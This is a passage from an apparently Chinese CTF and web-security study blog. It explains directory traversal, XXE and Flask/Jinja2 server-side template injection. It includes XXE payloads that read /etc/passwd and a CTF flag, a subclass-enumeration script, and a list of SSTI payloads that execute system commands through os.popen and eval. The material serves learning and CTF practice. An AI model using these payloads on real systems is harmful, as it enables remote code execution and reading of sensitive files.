class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$sex</span>=<span class="variable">$data</span>[<span class="string">&#x27;sex&#x27;</span>];</span><br><span class="line">        <span class="variable">$phonenum</span>=<span class="variable">$data</span>[<span class="string">&#x27;phonenum&#x27;</span>];</span><br><span class="line">        <span class="variable">$add</span>=<span class="variable">$data</span>[<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];…………</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//isset() 函数用于检测变量是否已设置并且非 NULL(\0 ≠ NULL)</span></span><br></pre></td></tr></table></figure>

<p><strong>垂直越权：</strong></p>
<p>攻击者 使用 权限低 的用户访问到 权限高 的用户，比如 普通用户 使用 管理员的功能</p>
<h1 id="x2F-x2F-目录遍历"><a href="#x2F-x2F-目录遍历" class="headerlink" title="..&#x2F;..&#x2F;(目录遍历)"></a>..&#x2F;..&#x2F;(目录遍历)</h1><blockquote>
<p>​	在Web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的过滤，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来。</p>
</blockquote>
<p>​	没什么困难，重要的是了解其文件树结构(BP中可以查看)，切到想要的文件目录即可</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote>
<p>XXE(xml external entity injection)，xml外部实体注入漏洞。<br>概括一下就是 攻击者 通过向服务器注入 xml实体内容,从而让服务器按照指定的配置进行执行。</p>
<p>也就是说 服务端 接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致XXE</p>
</blockquote>
<p><strong>XML</strong></p>
<p>​	eXtensible Markup Language，可扩展的标记语言(很像HTML)，无固定标签。用于 存储 和 传输 信息，经常被用作 配置文件。有且只有一个根元素、大小写敏感、属性值内容要用 双引号 括起…… </p>
<p>​	内部DTD</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;XXE&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	PHP伪协议也同样适用(外部DTD)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">name</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第一部分：xml申明信息，描述其 版本 和 编码方式</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第二部分：DTD</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[		&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>	</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span>		要求元素下的内容只能是文本，不能出现标签</span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span>		&lt;!--内部元素声明--&gt;</span></span><br><span class="line"><span class="meta"> 	</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span>	&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第三部分：文档元素</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>		</span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>DTD</strong></p>
<p>​	Document Type Definition(文档类型定义)，约束 xml 的文档格式，分为 外部DTD和内部DTD</p>
<p><strong>内部DTD定义</strong></p>
<p>​	<code>&lt;!DCOTYPE 根元素 [元素声明]&gt;</code> ：声明 <strong>根元素</strong> 下的元素(声明之后 根元素 下必须包含提到的元素)</p>
<p>​	<code>	&lt;!ELEMENT 元素名 (子元素……)&gt;</code> ：声明 <strong>元素</strong> 下的子元素</p>
<p>​	<code>	&lt;!ATTLIST 元素名 属性名 属性类型 默认值&gt;</code> ：声明 元素 的属性</p>
<ul>
<li>属性类型：CDATA，表示字符数据(character data)</li>
<li>默认值：#REQUIRED：必须出现，#IMPLIED：不是必要的</li>
</ul>
<p>​	+：表示出现至少一次、？：至多出现一次、*：可以出现任意次</p>
<p><strong>外部DTD定义</strong></p>
<p>​	定义一个 DTD文件，<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD文件名&quot;&gt;</code> 将其引入即可</p>
<p><strong>[NCTF2019]Fake XML cookbook</strong>：</p>
<p>​	查看源码后，可用看到这是xml，且有三个xml标签user、username、password</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/XXE-01.jpg"></p>
<p>用XXE读取flag</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">name</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞(模板注入)-入门</title>
    <url>/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>​	Server-Side Template Injection，服务器端模板注入，类似于SQL注入</p>
<p><strong>发生原因</strong>：框架的渲染函数在渲染的时候，往往对 用户输入的变量 不做渲染，这就导致了模板可控，进而引发代码注入。例如：<code>&#123;&#123;……&#125;&#125;</code>在Jinja2(python的模板引擎，Flask框架的一部分) 作为 变量包裹 的标识符，Jinja2在渲染的时候会把 <code>&#123;&#123;……&#125;&#125;</code> 包裹的内容 当做变量解析</p>
<p>使用模板的地方都有可能出现 SSTI，其并不属于任何一种语言</p>
<p><strong>模板引擎</strong>(用于Web开发的)</p>
<ul>
<li>为了使 用户界面 与 业务数据 分离而产生</li>
<li>可以生成特定格式的文档，利用 模板引擎 生成的HTML代码，其会提供一套 生成HTML代码文件 的程序</li>
<li>所以只需获取 用户的数据 放到渲染函数中，引擎生成的模板 与 用户提供的数据 就构成了HTML文件</li>
<li>PHP常见的模板引擎：Twig，Smarty；python常见的模板引擎：Jinja2，Tornado</li>
</ul>
<p><strong>Web框架</strong> 或者叫 Web应用框架：用来支持 动态网站、网络应用程序 及 网络服务开发 的一种开发框架</p>
<p><strong>页面渲染</strong></p>
<ol>
<li><p>后端渲染(服务端渲染)</p>
<ul>
<li>服务器直生成渲染好的 HTML页面 返回给客户端进行展示</li>
<li>现在的网页都是 HTML+CSS+JS，但早期是没有 JS 的，那时网页开发一般用 HTML+CSS+JSP&#x2F;PHP</li>
<li>在浏览器中输入URL时，浏览器会将URL发送到服务器上</li>
<li>服务器得到URL后会进行解析，然后生成一个 HTML+CSS+JSP&#x2F;PHP 的网页，最终的网页就生成了</li>
</ul>
</li>
<li><p>前端渲染</p>
<p>前端写的 JS代码 在浏览器中执行并渲染网页</p>
</li>
</ol>
<p><a href="https://blog.csdn.net/m0_51358164/article/details/126325176">搞懂什么是前端渲染和后端渲染</a></p>
<p>识别不同的引擎：</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-01.png"></p>
<p><strong>模板注入的步骤</strong></p>
<ol>
<li>判断是否为 SSTI</li>
<li>查看文件</li>
<li>调用可用的对象和函数</li>
</ol>
<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><p>​	一个python的Web应用程序框架，基于 Werkzeug WSGI工具包和 Jinja2模板引擎</p>
<p><strong>WSGI</strong></p>
<p>​	Web Server Gateway Interface（Web服务器网关接口，WSGI）已被用作 python Web 应用程序开发的标准，是 Web服务器 和 Web应用程序 之间通用接口的规范</p>
<p><strong>Werkzeug</strong></p>
<p>​	是一个WSGI工具包，它实现了请求，响应对象和实用函数， 这使得能够在其上构建web框架， Flask框架使用Werkzeug作为其基础之一</p>
<p><strong>Jinja2</strong></p>
<p>​	使用 结构表示一个变量，它是一种特殊的占位符，告诉 模版引擎 这个位置的值从渲染模版时使用的数据中获取</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> FLASK		<span class="comment"># 从flask框架中引入Flask类到当前应用中</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)		<span class="comment"># 创建一个Flask实例</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)				</span><span class="comment"># 路由规则,符合规则的url请求将会触发此函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>运行以上代码访问访问本机的5000端口，如果出现 <code>hello!</code> 则说明flask引入成功并能工作</p>
<h3 id="route路由"><a href="#route路由" class="headerlink" title="route路由"></a>route路由</h3><ul>
<li><p>服务器对于网络请求的识别，都是通过解析该 网络请求的URL地址 和 所携带的参数 来完成的</p>
</li>
<li><p>route中所带的参数是一个字符串，其对应它要响应URL的标示，如此处的字符串为 <code>/</code>，表明当网络访问地址为 <code>http://127.0.0.1:5000/</code> 时，此语句后面定义的函数才会被调用</p>
</li>
<li><p>我们也可以用 route 来规定 URL 的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/name/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot;,hello!&quot;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>http://127.0.0.1:5000/name/nikaido</code>时，<code>nikaido</code> 就会被作为参数 name 传入函数中，最后的结果如下图</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-05.jpg" alt="SSTI-05"></p>
</li>
</ul>
<h3 id="main入口"><a href="#main入口" class="headerlink" title="main入口"></a>main入口</h3><p>​	对于很多编程语言来说，程序都必须有一个入口，比如C，C++程序运行时会从 main函数 开始；而 python 属于脚本语言，它是从脚本第一行开始运行，没有统一的入口（定义的函数只有在调用的时候才会被执行）</p>
<p>​	当 <code>.py</code> 文件直接运行时，<code>if __name__ == &#39;__main__&#39;:</code> 内的代码将会被执行；如果 <code>.py</code> 文件以模块的形式被导入时，其内部的代码将<strong>不会被执行</strong></p>
<p>​	一个 python 源码文件除了可以直接被运行，还可以作为模块(库)被其他 <code>.py</code> 文件导入，当其被作为模块导入时，不想被执行的代码可以放进 <code>if __name__ == &#39;__main__&#39;: </code> 内</p>
<p>​	python模块都包含内置的变量 <code>__name__</code>，当该文件(模块)被直接执行的时候，<code>__name__</code> 为 <code>__main__</code> ；如果该模块被导入到其他文件中，则被导入模块的 <code>__name__</code> 为文件名（不包含 <code>.py</code>）</p>
<ul>
<li><p>测试的时候，我们可以使用debug，这样改代码的时直接保存，刷新网页就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"><span class="comment">#或者在app.run的基础上加debug=True,即 app.run(debug=True)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果不加debug，那每次改代码都要运行一次程序，并且把前一个程序关闭</p>
</li>
</ul>
<h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><p>​	为了让网页看起来更好看，我们就需要对模板进行渲染，py文件和模板文件夹要放在同一个文件夹下并且放置模板文件的文件夹要命名为templates</p>
<p>​	模板是一个包含响应文本的文件，其中用 占位符(变量) 表示动态的部分，告诉模板引擎其具体的值需要从给出的数据中获取</p>
<h3 id="模板使用"><a href="#模板使用" class="headerlink" title="模板使用"></a>模板使用</h3><ul>
<li><p>先测试一下，创建 templates 文件夹存放模板文件，在该目录下创建一个模板文件 index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>test.py 文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行后发现能正常访问并且返回的内容正是 index.html 的文件内容</p>
</li>
</ul>
<p>接下来试试往 html文件 中传入参数</p>
<ul>
<li><p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello,&#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>your age:&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>your tel:&#123;&#123;tel&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>test.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;niakido&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tel&quot;</span>:<span class="string">&quot;123456780&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,**<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>运行效果如下图（传入的参数时如果有多个参数，可以用形参的形式去传，<del>欸，你问我形参是什么？好像是跟实际参数(实参)对立的，形参是形式的参数）</del></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-06.jpg" alt="SSTI-06"></p>
<p>​	双星号(**)在 python 中通常用于解包操作，它可以将一个字典中的键值对拆分为多个关键字参数传递给一个函数，上面相当于将这 三个键值对 作为 关键字参数 传递给 <code>render_template</code> 函数</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​	渲染模板时 没有严格控制对用户的输入 或 使用了危险模板，导致用户可以和flask程序进行交互，从而造成漏洞的产生</p>
<ul>
<li><p>无二次渲染，这里的 str 是被 <code>&#123;&#123;&#125;&#125;</code> 包起来的，它会被预先渲染转义然后才输出，所以不会被渲染</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)		</span><span class="comment">#在python中，带着@的就是装饰器,本质是扩展原本函数功能的一种函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;s&#x27;</span>)		<span class="comment">#获取 GET 请求参数</span></span><br><span class="line">    html = <span class="string">&#x27;&lt;h1&gt;welcom!&lt;/h1&gt; &lt;p&gt;&#123;&#123;str&#125;&#125;&lt;/p&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html,<span class="built_in">str</span>=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
</li>
<li><p>有二次渲染，直接将用户传入的参数值放入html中，然后经过模板渲染后输出，导致用户对输入值可控</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&lt;h1&gt;welcom!&lt;/h1&gt; &lt;p&gt;%s&lt;/p&gt;&#x27;</span>%(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>​	这里的<code>@app.route(&#39;URL&#39;)</code> 是Flask框架中的一个装饰器，它的作用是在程序运行时，装饰一个视图函数，用给定的 URL规则 和 选项 去表示它</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/103/SSTI-04.jpg"></p>
</li>
</ul>
<p>​	<del>在本地测试时，用 + 测试会报错，哎！以后还是多试试其他符号吧</del></p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
<li><p>在 python 中所有被 <code>__</code> 双下划线包起来的方法叫做魔术方法，也叫双下划线方法</p>
</li>
<li><p>使类实例的行为更像内置类型 或者 自定义一些特殊方法，以便更好地控制 类实例的创建、初始化、属性访问、运算符重载、序列化等行为</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__ 				<span class="comment"># 获得当前对象的类</span></span><br><span class="line">__mro__					<span class="comment"># 列出解析方法的调用顺序，类似于bases</span></span><br><span class="line">__bases__				<span class="comment"># 列出其基类(__base__和__mro__都是用来寻找基类的)</span></span><br><span class="line">__subclasses__()		<span class="comment"># 返回子类列表</span></span><br><span class="line">__dict__				<span class="comment"># 列出当前属性/函数的字典</span></span><br><span class="line">__init__				<span class="comment"># 一般跟在类的后面，相当于实例化这个类</span></span><br><span class="line">__globals__				<span class="comment"># 以字典的形式返回函数所在的全局命名空间所定义的全局变量</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类</p>
</li>
<li><p><code>__bases__</code>：用来查看类的基类，也可以使用 数组索引 来查看 特定位置的值。 通过该属性可以查看该类的所有<strong>直接父类</strong>，它返回的是所有直接父类组成的<strong>元组</strong></p>
</li>
<li><p><code>__subclasses__()</code>：返回基类 object 的子类</p>
<p> 想要确定某个子类的索引时，可用以下脚本遍历所有子类<del>(哎，最开始学SSTI的时候我还是用 Ctrl+F 数的)</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,html,re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    response = requests.get(url+SSTI,headers=headers)</span><br><span class="line">    text = html.unescape(response.text)</span><br><span class="line">    text = re.findall(<span class="string">r&quot;&lt;\w* &#x27;[\w,.,-]*&#x27;&gt;&quot;</span>,text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(text): </span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://xxx.XXX.xxx.xxx:xxx/&#x27;</span></span><br><span class="line">    SSTI = <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;&quot;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>__builtins__</code>：可用于查看当前所有导入的内建函数</p>
</li>
<li><p><code>__globals__</code>：以字典的形式返回当前位置的所有全局变量（记录了当前文件全局变量的值）</p>
<blockquote>
<p>如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象时，我们就可以利用 globals 属性访问全局的变量。该属性保存的是函数全局变量的字典引用</p>
</blockquote>
</li>
</ul>
<p>收集的payload(python3)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">	<span class="comment"># python3没有file了，所以用open</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;1.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 命令执行,[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 还可以用 eval,import等全局函数来执行命令:</span></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="寻找-类-执行命令"><a href="#寻找-类-执行命令" class="headerlink" title="寻找 类 执行命令"></a>寻找 类 执行命令</h2><p>​	可以用来执行命令的类有很多，原理是遍历含有 eval函数 或者 os模块 的子类，利用这些子类中的eval函数或 os模块 执行命令（）</p>
<h3 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h3><p>编写脚本遍历目标 python 环境中含有内建函数 eval 的子类的索引号</p>
<p><del><a href="https://xz.aliyun.com/t/9584#toc-5">脚本是偷的</a></del>，例题：<strong>BUUCTF-[Flask]SSTI</strong></p>
